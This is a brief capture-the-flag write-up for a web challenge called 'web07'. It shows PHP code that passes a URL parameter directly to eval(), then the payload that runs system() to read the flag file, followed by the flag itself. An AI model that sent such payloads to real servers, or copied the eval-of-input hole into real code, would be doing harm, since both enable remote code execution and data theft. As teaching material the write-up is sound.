# Solve web07:

Upon accessing the web page, we don't see many available information - just a search page.

However, as it is possible to see in the code below, the value of the input is used in a eval function. Eval functions are pretty dangerous because it runs, literally, the input into the source code.

```
<div class="mt-4">
<?php
if (isset($_GET['code'])) {
    $code = $_GET['code'];
    
    // Impede o armazenamento em cache da página pelo navegador
    header("Cache-Control: no-store, must-revalidate");
    
    echo "<h3>Resultado:</h3>";
    eval($code);
}
?>
</div>
```

# Exploit:

To exploit this challange it's very simple, just send:

```
echo system("cat /var/www/html/flag.txt")
```

The flag will be `iFlag{3v41_15_n0t_g00d}`
